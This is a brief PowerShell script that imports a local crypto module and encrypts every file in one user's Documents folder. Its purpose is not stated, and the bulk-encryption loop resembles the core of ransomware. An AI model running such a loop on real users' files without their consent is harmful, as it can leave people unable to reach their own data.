Import-Module .\crypto.psm1

$TargetDir = "C:\Users\alice\Documents"

Get-ChildItem -Path $TargetDir -File | ForEach-Object {
    Invoke-FileEncrypt -Path $_.FullName
}
